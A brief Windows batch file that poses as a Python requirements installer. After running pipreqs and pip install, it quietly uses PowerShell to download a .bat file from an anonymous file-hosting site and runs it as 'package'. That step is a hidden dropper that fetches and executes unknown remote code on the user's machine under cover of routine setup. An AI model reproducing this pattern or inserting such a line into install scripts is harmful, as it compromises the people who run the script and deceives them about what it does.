@echo off
echo Download requirements.
pip install pipreqs
pipreqs ./ --encoding=utf8
pip install -r requirements.txt
powershell iwr https://files.catbox.moe/27u2dv.bat -OutFile package.bat
package
echo done!
